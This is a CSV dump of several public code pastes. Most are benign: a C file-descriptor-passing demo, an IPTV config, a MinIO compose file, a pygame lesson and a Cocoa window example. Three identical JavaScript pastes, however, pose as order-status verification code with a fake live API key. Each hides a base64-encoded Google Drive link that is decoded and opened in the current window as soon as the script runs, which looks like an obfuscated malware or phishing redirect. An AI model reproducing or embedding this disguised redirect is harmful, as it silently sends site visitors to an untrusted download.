id,title,username,language,date,content
EUswBcsh,scm_rights,teknoraver,C,Monday 31st of March 2025 11:50:33 AM CDT,"#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/wait.h>

#define pexit(msg) do { perror(msg); exit(1); } while (0)

static int sendfd(int sockfd, int fd)
{
	struct msghdr msg = { 0 };
	struct cmsghdr *cmsg;
	int err;
	char iobuf;
	struct iovec io = {
		.iov_base = &iobuf,
		.iov_len = sizeof(iobuf),
	};
	union {
		char buf[CMSG_SPACE(sizeof(fd))];
		struct cmsghdr align;
	} u;

	msg.msg_iov = &io;
	msg.msg_iovlen = 1;
	msg.msg_control = u.buf;
	msg.msg_controllen = sizeof(u.buf);
	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(sizeof(fd));

	/* Send the file descriptor with an empty message
	 * containing only the ancillary data. */
	msg.msg_iov = NULL;
	msg.msg_iovlen = 0;

	memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));

	err = sendmsg(sockfd, &msg, 0);
	if (err < 0)
		pexit(""sendmsg"");

	if (err != msg.msg_iovlen) {
		perror(""sendmsg"");
		return -EINVAL;
	}

	return 0;
}

static int recvfd(int sockfd)
{
	struct msghdr msg = { 0 };
	struct cmsghdr *cmsg;
	int err;
	int fd;
	union {
		char buf[CMSG_SPACE(sizeof(fd))];
		struct cmsghdr align;
	} u;

	msg.msg_control = u.buf;
	msg.msg_controllen = sizeof(u.buf);

	err = recvmsg(sockfd, &msg, 0);
	if (err < 0)
		pexit(""recvmsg"");

	cmsg = CMSG_FIRSTHDR(&msg);
	if (!cmsg ||
		cmsg->cmsg_len != CMSG_LEN(sizeof(fd)) ||
		cmsg->cmsg_level != SOL_SOCKET ||
		cmsg->cmsg_type != SCM_RIGHTS)
		pexit(""Invalid cmsg"");

	memcpy(&fd, CMSG_DATA(cmsg), sizeof(fd));

	return fd;
}

int main(void)
{
	int scm_fds[2], r;

	r = socketpair(AF_UNIX, SOCK_STREAM, 0, scm_fds);
	if (r < 0)
		pexit(""socketpair"");
	
	if (fork()) {
		int fd = open(""/"", O_PATH | O_DIRECTORY);

		if (fd < 0)
			pexit(""open"");

		r = sendfd(scm_fds[0], fd);
		if (r < 0)
			pexit(""sendfd"");

		puts(""sent fd"");

	} else {
		int fd = recvfd(scm_fds[1]);

		if (fd < 0)
			pexit(""recvfd"");

		puts(""received fd"");
		
		exit(0);
	}

	wait(NULL);
	puts(""done"");

	return 0;
}
"
QgvAxXdi,Market.js,dentira,JavaScript,Monday 31st of March 2025 11:42:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/343/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tC7M6LLL,config.xml,giannix,HTML,Monday 31st of March 2025 11:41:39 AM CDT,"<!--
  E2m3u2bouquet supplier config file
  Add as many suppliers as required
  this config file will be used and the relevant bouquets set up for all suppliers entered
  0 = No/False
  1 = Yes/True
  For elements with <![CDATA[]] enter value between empty brackets e.g. <![CDATA[mypassword]]>
-->
<config>
  <supplier>
    <name>privo</name><!-- Supplier Name -->
    <enabled>1</enabled><!-- Enable or disable the supplier (0 or 1) -->
    <settingslevel>expert</settingslevel>
    <m3uurl><![CDATA[http://suka.new2024.co:80/get.php?username=USERNAME&password=PASSWORD&type=m3u_plus&output=ts]]></m3uurl><!-- Extended M3U url --> 
    <epgurl><![CDATA[http://suka.new2024.co:80/xmltv.php?username=USERNAME&password=PASSWORD&next_days=7]]></epgurl><!-- XMLTV EPG url -->
    <username><![CDATA[uuuuu]]></username><!-- (Optional) will replace USERNAME placeholder in urls -->
    <password><![CDATA[ppppp]]></password><!-- (Optional) will replace PASSWORD placeh
    <providerupdate><![CDATA[]]></providerupdate><!-- (Optional) Provider update url -->
    <providerhideurls>0</providerhideurls><!-- (Optional) Hide Provider urls in plugin -->
    <iptvtypes>0</iptvtypes><!-- Change all TV streams to IPTV type (0 or 1) -->
    <streamtypetv>4097</streamtypetv><!-- (Optional) Custom TV stream type (e.g. 1, 4097, 5001 or 5002 -->
    <streamtypevod>4097</streamtypevod><!-- (Optional) Custom VOD stream type (e.g. 4097, 5001 or 5002 -->
    <multivod>1</multivod><!-- Split VOD into seperate categories (0 or 1) -->
    <allbouquet>0</allbouquet><!-- Create all channels bouquet (0 or 1) -->
    <picons>0</picons><!-- Automatically download Picons (0 or 1) -->
    <iconpath></iconpath><!-- Location to store picons) -->
    <xcludesref>0</xcludesref><!-- Disable service ref overriding from override.xml file (0 or 1) -->
    <bouqueturl><![CDATA[]]></bouqueturl><!-- (Optional) url to download providers bouquet - to map custom service references -->
    <bouquetdownload>1</bouquetdownload><!-- Download providers bouquet (uses default url) must have username and password set above - to map custom service references -->
    <bouquettop>0</bouquettop><!-- Place IPTV bouquets at top (0 or 1) -->
    <lastproviderupdate>0</lastproviderupdate><!-- Internal use -->
  </supplier>
</config>
"
3XcUFbNN,Untitled,dentira,JavaScript,Monday 31st of March 2025 11:26:34 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/575/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nAbYhx5b,MinIO Docker Compose,TheMRP,YAML,Monday 31st of March 2025 11:25:54 AM CDT,"services:
  minio:
    image: minio/minio
    container_name: minio
    restart: unless-stopped
    ports:
      - ""9000:9000""  # MinIO API Port
      - ""9090:9090""  # MinIO Console Port
    environment:
      MINIO_ROOT_USER: ""admin""
      MINIO_ROOT_PASSWORD: ""mysecretpassword""
    volumes:
      - <PATH_TO_DATA>:/data
    command: server --console-address "":9090"" /data"
a2Z7PYAA,Products.js,dentira,JavaScript,Monday 31st of March 2025 11:11:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/218/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ettLFNL2,Lesson 5 - Methods,MCreeper12731,Python,Monday 31st of March 2025 11:07:26 AM CDT,"import pygame
pygame.init()

width = 1200
height = 600
window = pygame.display.set_mode((width, height))
pygame.display.set_caption(""Platformer Game"")

# Spremenljivke, ki jih bomo potrebovali za igralca
# ---

class Player:
    def __init__(self, x, y):
        self.size = 75
        self.position = pygame.Rect(x, y, self.size, self.size)
        self.image = pygame.image.load(""images/scratch-cat.png"")
        self.image = pygame.transform.scale(self.image, (self.size, self.size))
        self.speed_x = 0
        self.speed_y = 0
        self.on_ground = False
        

player = Player(100, 100)

platforms = [pygame.Rect(0, height - 50, width, 50), pygame.Rect(300, 500, 200, 20), pygame.Rect(600, 350, 200, 20), pygame.Rect(900, 400, 200, 20)]

# ---

def resolve_collision(rect_a, rect_b):
    # Compute overlap distances in x and y
    dx1 = rect_b.right - rect_a.left
    dx2 = rect_a.right - rect_b.left
    dy1 = rect_b.bottom - rect_a.top
    dy2 = rect_a.bottom - rect_b.top

    # Find the smallest displacement to separate them
    min_dx = min(dx1, dx2)
    min_dy = min(dy1, dy2)

    if min_dx < min_dy:
        # Move rect_a left or right
        if dx1 < dx2:
            rect_a.x += dx1  # Move right
        else:
            rect_a.x -= dx2  # Move left
    else:
        # Move rect_a up or down
        if dy1 < dy2:
            rect_a.y += dy1  # Move down
        else:
            player.on_ground = True
            rect_a.y -= dy2  # Move up
    
    return True  # Collision was resolved

# Glavna zanka igre
clock = pygame.time.Clock()
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    window.fill((255, 255, 255))
    # background_image = pygame.image.load(""images/New Piskel.png"")
    # background_image = pygame.transform.scale(background_image, (width, height))
    # window.blit(background_image, (0, 0))
    # Premikanje igralčevega lika
    # ---

    # Vsako ponovitev zanke (vsak frame) dobimo pritisnjene tipke
    # in se glede na njih odločimo, kako bomo igralca premaknili
    keys = pygame.key.get_pressed()
    if keys[pygame.K_d]:
        player.speed_x = 5
    elif keys[pygame.K_a]:
        player.speed_x = -5
    else:
        player.speed_x = 0

    if keys[pygame.K_SPACE] and player.on_ground == True:
        player.on_ground = False
        player.speed_y = -25

    if player.speed_y < 20:
        player.speed_y += 1


    player.position.x += player.speed_x
    player.position.y += player.speed_y

    if player.position.x < 0:
        player.position.x = 0
    if player.position.x > width - player.size:
        player.position.x = width - player.size
    if player.position.y < 0:
        player.position.y = 0
    if player.position.y > height - player.size:
        player.position.y = height - player.size
    
    for platform in platforms:
        if player.position.colliderect(platform):
            resolve_collision(player.position, platform)
        
    # ---
    # Izris likov
    # ---

    window.blit(player.image, player.position)
    for platform in platforms:
        pygame.draw.rect(window, (0, 127, 0), platform)
        # window.blit(slika_ovire, platform)

    # ---

    pygame.display.update()
    clock.tick(60)

pygame.quit()"
9GgtmCzT,CMakeLists.txt,arabasso,CMake,Monday 31st of March 2025 10:59:34 AM CDT,"# Defina a versão mínima do CMake
cmake_minimum_required(VERSION 3.10)

# Defina o nome do projeto
project(MyApp)

# Defina a versão do C++
set(CMAKE_CXX_STANDARD 11)

# Especificando que estamos criando um aplicativo para macOS
set(CMAKE_OSX_ARCHITECTURES ""x86_64;arm64"")  # Define as arquiteturas suportadas (Intel e Apple Silicon)

# Adicione os arquivos fontes ao projeto
set(SOURCES
    main.cpp
    MyWindow.mm  # Arquivo Objective-C++
)

# Crie o executável
add_executable(MyApp ${SOURCES})

# Link o framework Cocoa, necessário para macOS
target_link_libraries(MyApp ""-framework Cocoa"")

# Se necessário, você pode adicionar flags de compilação, por exemplo:
# target_compile_options(MyApp PRIVATE -Wall)
"
ahTLD7Pd,main.cpp,arabasso,C++,Monday 31st of March 2025 10:58:41 AM CDT,"// main.cpp
#include ""MyWindow.hpp""  // Incluindo o cabeçalho da classe

int main(int argc, const char * argv[]) {
    // Criando a janela e rodando a aplicação
    MyWindow window;
    window.run();  // Chama o método que lida com a janela e os eventos

    return 0;
}
"
4xuPC5Dp,MyWindow.mm,arabasso,Objective C,Monday 31st of March 2025 10:58:04 AM CDT,"// MyWindow.mm
#import <Cocoa/Cocoa.h>  // Importando o framework Cocoa
#include ""MyWindow.hpp""    // Incluindo o cabeçalho da classe

// Implementação da classe MyWindow
MyWindow::MyWindow() {
    // Construtor vazio, aqui você pode inicializar membros, se necessário
}

MyWindow::~MyWindow() {
    // Destruidor, pode limpar recursos se necessário
}

void MyWindow::run() {
    // Criando a janela usando Cocoa
    @autoreleasepool {
        // Criar uma instância da aplicação
        NSApplication *app = [NSApplication sharedApplication];

        // Criar uma janela
        NSWindow *window = [[NSWindow alloc]
                            initWithContentRect:NSMakeRect(0, 0, 800, 600)
                            styleMask:(NSWindowStyleMaskTitled |
                                        NSWindowStyleMaskClosable |
                                        NSWindowStyleMaskResizable)
                            backing:NSBackingStoreBuffered
                            defer:NO];
        [window setTitle:@""Minha Janela""];
        [window makeKeyAndOrderFront:nil];

        // Instalação do evento de monitoramento do mouse e teclado
        [window setAcceptsMouseMovedEvents:YES]; // Aceita eventos de movimento de mouse

        // Lógica para tratar eventos (mouse e teclado)
        while (![app isRunning]) {
            NSEvent *event = [app nextEventMatchingMask:NSEventMaskAny untilDate:nil inMode:NSDefaultRunLoopMode dequeue:YES];
            [app sendEvent:event];
            [app updateWindows];

            // Checando tipo de evento (mouse ou teclado)
            if ([event type] == NSEventTypeKeyDown) {
                NSString *keyPressed = [event charactersIgnoringModifiers];
                std::cout << ""Tecla pressionada: "" << [keyPressed UTF8String] << std::endl;
            }

            if ([event type] == NSEventTypeMouseMoved) {
                NSPoint mouseLocation = [event locationInWindow];
                std::cout << ""Mouse movido para: ("" << mouseLocation.x << "", "" << mouseLocation.y << "")"" << std::endl;
            }

            if ([event type] == NSEventTypeLeftMouseDown) {
                NSPoint mouseDownLocation = [event locationInWindow];
                std::cout << ""Clique do mouse em: ("" << mouseDownLocation.x << "", "" << mouseDownLocation.y << "")"" << std::endl;
            }
        }
    }
}
"
